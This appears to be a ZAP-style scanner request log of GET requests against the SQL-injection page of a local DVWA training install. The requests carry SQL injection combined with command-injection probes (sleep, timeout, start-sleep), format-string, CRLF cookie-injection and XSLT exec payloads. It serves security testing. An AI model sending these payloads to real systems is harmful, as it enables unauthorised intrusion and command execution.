257,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26timeout+%2FT+15.0%26%27&Submit=Submit,302,Found,1,628,0
258,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctimeout+%2FT+15.0&Submit=Submit,302,Found,3,628,0
259,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,2,628,0
260,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,1,628,0
261,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bstart-sleep+-s+15.0&Submit=Submit,302,Found,4,628,0
262,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bstart-sleep+-s+15.0+%23&Submit=Submit,302,Found,1,628,0
263,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26sleep+15.0%26,302,Found,3,628,0
264,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bsleep+15.0%3B,302,Found,1,628,0
265,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26sleep+15.0%26%22,302,Found,2,628,0
266,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bsleep+15.0%3B%22,302,Found,1,628,0
267,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26sleep+15.0%26%27,302,Found,1,628,0
268,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bsleep+15.0%3B%27,302,Found,1,628,0
269,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26timeout+%2FT+15.0,302,Found,2,628,0
270,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctimeout+%2FT+15.0,302,Found,2,628,0
271,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26timeout+%2FT+15.0%26%22,302,Found,2,628,0
272,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctimeout+%2FT+15.0,302,Found,2,628,0
273,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26timeout+%2FT+15.0%26%27,302,Found,1,628,0
274,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctimeout+%2FT+15.0,302,Found,5,628,0
275,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0,302,Found,2,628,0
276,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bstart-sleep+-s+15.0,302,Found,1,628,0
277,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bstart-sleep+-s+15.0,302,Found,1,628,0
278,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0+%23,302,Found,1,628,0
279,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
280,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,1,613,1342
281,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,3,613,1342
282,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,0,224,366
283,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=xbmmbRwxMBasCtLtGqMQvLlnuXQoScgWNyVOtmsIyYAjsfZoVOXPTeoIHwaaVxtNhnlFYGfxrxiIgfhmULwqRQXdRyCaZWGhgTwTRjcsAdnWyXeuOQxMLmfijUfhqHaBPfvWKdoBWucmrGUUYymbDUNmmjwTfjtAkheuafDnWQCLeGOMltsMXPIGMnGcORjkRsWTlsSqNLrCtsgvvWVTlWflpkcdsiUjOEmZamOEfNOnJndabUuyrCIvyDudXifMalOnUXuwYEisnUFYiVAXLLSHMmxMTfrJojRWUpjBNEedkfXUeqVRVfCtvsDlUfoDLevjJuCAPQUXflnNbUMZIdTRXdIcONvmRHfmIUxtoEoJGAmNCYtoqtIooOkQgHTPjlnKCjvTECmvfFqFAlCmbGdbQZRCVcjLMFiNcXCHHKMaMgRkUjFEVQOdlWiYbNKHpSviMHInSiMUcYxsFKgmnTmHJvMAuJnFEERGNdujljCwIRHWHrqdIYNvtpyGKXQBltROqbVkHnoBKFwbymkRrmCKDuFMhonhyyipIoLgvJUJZNXevBdXoNLDVglLbZfiWREDSwuTuVOqpgQhCmLrhNwEJgjnehgmMixqhtmXETdIiosJTiBtWEyeOIaSYGiwrYMuQPYpdmxZtEQslSaIVxGrAhfpZTZqojKkqoFDQWEEFBZfooMhYbMJvIJiLErdVrmhZXUosCvOkTeeSCumbLsPpExdbTDOCTBvNWJnOoNtftUZhIiebyySweChlkIdUrTsHOdsHrSSHLXsSTbpIdixnDTMFVNHiQuNxlYcYsxnYFNWHUFCLVFLKJfpRCbZiWJSjFFjLrrOmPHNsirZQoSKaZBWSgpUmoRZkFKAtMjZrSxVrIKmtLiPnkrhOwZVLriViybBgdgkTUfUWqtIlFsTRvgWdNwualoxeMTLeVFTTxYvvujkbtTvYSBvwtQAVdthDNsUTvLSyZCnNSmTyJtrjgBLXcvwWaHbgvSTOcFMLKyNCaHWvhxphoElexNhMZecXHObGWfIaIQKUGFXGsrSiluruHDhKOCmbPfoXOTBtFjcyrbZxTLlglZAwDEMlCZFntJUdHSTmkoPKyFBxQntTNUtFxbfUMvkChGbYZpvaJhBsdZqTxlYFHNxOwWCGFfUIyqtRKOucAcJlbnENsTLiACMFxWgfuBYfoIwhNJaHuGwisXqjGMDJCeYIBvofLVgWpdYAFZHAkaxBVxQMhFsVYVWUrUsLRqAYAKbPfQgUpFknsNapFTumDaLsBXyyIpZcydZVmRvyWVQBWZqjEaArmUHSlbIKGtWGYqbgTSLiISYfUWmqnXvGCERsvoHnvuksJvnBkaPjurAXHtuSFKEUpjIKoaqbafQwCPFLPhPIpaVRbppmacwVMunMbdsKCSStNGsgNwUMOhLwexxnYLLqtLBihDkMiJobLdoaZvZGXShReEynKqheBcnJSVYZnGdfpMncSIENuEyARkXFJSgeMLvIHymKeyZOPmJNemUJLYBWphjdncjTUVlMykJRUsrucWaPSexgRumyFmQWWuFEhUSMuvLHKlrALikcnBkrDlAWdqhCYZjrwZVvTIpenbwLgfRYscqotypKeUIHWSArUwtjLcunCynwOuONkPyWPPaOVJnvrJlaPOoDAjKhxSTcqfflkGrVcZAKigkdmVaTMxOiFpstLQQNlBxBjgWvExrpssAnpdKmvAXgCQSPrDuSKnWSmFdoDlHEaLloaQhPlRDkYaKKhJMdWYZnPsQjIcyZxFXAwMJGJeLIHIiCanpNtfOoCNyxBYlrKWWnBjVdvKQUYwNmEeRXURuOsOTmyjwVruFeCbxkovOdrekyVyXylOeRMJQSVWrYXBHBZRxNTunlgTxXaNXTQFFrpWFQKkhmKBKEFigQyBXxtWkoCRjqeiTnXwfHxsfQVniCqyhIisIpiFCCJhrDHoNfxnyvkttiFpYCvAlgmqTcUIlkZHACXwtpCLnIOteJOKaerrSANETImdZNqnKXPqhuKXbUfkXxgKnfchoIOvSyEGAoCnNAMObBEuqmuPhAPNqvkYusEkupaUNlnpllSIxKbarGHmIZNoq&Submit=Submit,200,OK,1,613,1342
284,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=dlnIGZjlunyFnSirRJaAriBkXUmMOqyBvUEVDTvPNGMChErJrMVTvuVevSxYOmEBfCUGhZsVZUgjlcaCQKItqIoZLCLWpndCOWbfTPxPUeJHBLVoqgHNqpknsEWtarLJiZWtoxMRtvcvYbJVpMWNpTNsAinfKUxUpRXJnbhfnRhswZINawvcnFHiCEGSyoMVLkuqQHIKibDjPLRoGrEIbouJqZsfgoWMscnwHfoeqGYETUttNQwPCnFaijRfqSphKQEXOwAhRQJwCVhGfXKPBLRyggmJbcvQYusyfNZHURtaxXXCoMXoVVsQvsqCNafgONwkIdyGRaWotAXsDqKuQKgvYNOgFRvVqtxkjONIPRgLIenPSXPyIRfnKdDvxHTJmatEvmCXwFViDniCYYYBWGqvECYLeZehyTNfRIORspkNSiIqcsswRcTiPXGFplUPajtgbUwYGwemdYAemfWZFujqEptFnimcxGnjpFLYpLqderAbAONTpMclCZZcwgVUKKinBVCwNDOHMlvxpDwhRedrFhKNqtZTxWbNmKCwWNRnkZdlQwRFXfUAARseuyhJGsbetHSndIWPclwKsdLiYCknKeCACbSpRPiNPlQTTofEcDUohhrCVrctSgtcgZfduUGmqqlcyQuinVHopAelMunGOCSuGHpKsjDyjyRqlJtTcenGcEaNLYjLCeBeoStcmxaYKlirIEERNvidRYLIUhjsKMLuCAKrWIWBiTCMAXoJGUlbuDwIeZNMwwJmfjquPKBoJwvUZogPtYmUjaAFBkWCUYxRMPUCKqHnLtKwklEHwGJPTxersSfcjpfALRanPVGdFbbxGGWROOglbGNgyYnNDYZXlsjGpnNEbvBwMJaIHpTefGUDHasTQwBAFXXnTHjWiaMNsQrtBjjQbHDtnYFnCqYdHHPLRLbMAlhXLtxfrwKtSaUxdijUqoNSmUwgrTgunBfIDfaGkDiGWHkQBvpLyOqDShIFTBZeFUmxayLFvXpWcYXZYkgEkuGSPOvNRFUwxIvwRSEfArFbUCpesqjhiJJyFFQEOuSIsTequwyhGYymHdufmrtbVTFyrTYbgDBRRyHHuKIQwNaaZYUJaBAUruSttwmqVRVkTuYNnijHvUPZaLbnaCvxRKqFLyOEOnddCWmhIaNQuZsjelOjNCscoPrUDEvuOpHdLBnTqWgOSffKHvoLyLZdrvBRHnbsOkZanJuiToxZIRdawKsnfGEIDIIJEoWCjOxRPRVYsJEthhnRVNgLxltVKWQjsuDoCFVjwvEkwOycvorDqCxNTvmeVJiEUBGtimbatrfIBgnCbQvfZHpFqhqZCsKfeiLAQprcUwLoTboFqaZVtWFPgdVZdSiSRaJwIkwlEeorjnLDMyHNcHOISMQMVdmHKciKNLSMbonItfaHpjJMWWBgKfUIfWsZuwshAhGIaGAJOxtZhOZMsHOtfKyTQwdjYKWhYBhxPxXJOvfxfMocUangijMxlVvFMIsYOwVeVMUfQYWHehXWMvJospsFFCJUVsDfJMTLaHgkjxAGXHBjJodTyxFGoFJYNJUquMbhHJHEslDVKjQDZTGAFgSiuPMIHiOQwhyfjeomNCKkLSZVyUjpBFsLXdCXGYXyCCjFJxvGRKZkjqorltnekkPbVHwPtYYUpDPYnNZXoiviCywclkkimCmpglskFCsTlaJkjtVdWOjgyZPGvTKDgTqoWWsNorpsPYQNhGmhkdXVytShpxMWqVavPUHaIaixFKHvkoGyGnsIGKpnnufApKQkqIvAHtPDEhvfgAsLYZOwwKOZtABapKwBHqIWQLiNsgtGKAglIrADmoFXsgDDUJpoanMdCAsNqucwlqmsXXDIibqUmpKqsFiechpulPEVvWyWsncooTeEMKstayyObOieVesCdPHGIvotKxwUbhgUXnIxudSDTBMccONWgcbCMVAcVLOpbBMGpqpywrTkAJIwStJMIVcEyVHWVImJkdgeUZLnirbwTfKpMpvlikggwfGoxINKlQqZHqGXpUgYrrIPRhJOfiTZQFRlqPVrQifrgYgtBYSFuyqaxTOqQhatHHtcaAmgoTqQQTIUvNYR,200,OK,1,613,1342
285,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
286,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP&Submit=Submit,200,OK,1,613,1342
287,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&Submit=Submit,200,OK,2,613,1342
288,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&Submit=Submit,200,OK,1,613,1342
289,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP,200,OK,1,613,1342
290,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,200,OK,1,613,1342
291,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A,200,OK,1,613,1342
292,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
293,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,2,628,0
294,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
295,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
296,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
297,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
298,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
299,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
300,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,0,628,0
301,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
302,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
303,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
304,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
305,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
306,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
307,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
308,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,3,613,1342
309,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?=&Submit=Submit,200,OK,1,613,1342
310,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=&Submit=Submit,200,OK,2,613,1342
311,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,1,613,1342
312,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2B&Submit=Submit,200,OK,1,613,1342
313,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%00&Submit=Submit,200,OK,1,613,1342
314,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7C&Submit=Submit,200,OK,1,613,1342
315,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,0,613,1342
316,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&=,200,OK,1,613,1342
317,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=,200,OK,1,613,1342
318,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%40,200,OK,0,613,1342
319,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2B,200,OK,1,613,1342
320,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%00,200,OK,1,613,1342
321,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7C,200,OK,1,613,1342
322,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
323,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
324,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
325,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
326,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C&Submit=Submit,200,OK,1,613,1342
327,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
328,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=system-property%28%27xsl%3Avendor%27%29%2F%3E&Submit=Submit,200,OK,1,613,1342
329,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
330,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
331,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
332,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&Submit=Submit,200,OK,1,613,1342
333,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
334,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C,200,OK,1,613,1342
335,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,613,1342
336,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,613,1342
337,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,613,1342
338,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
339,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
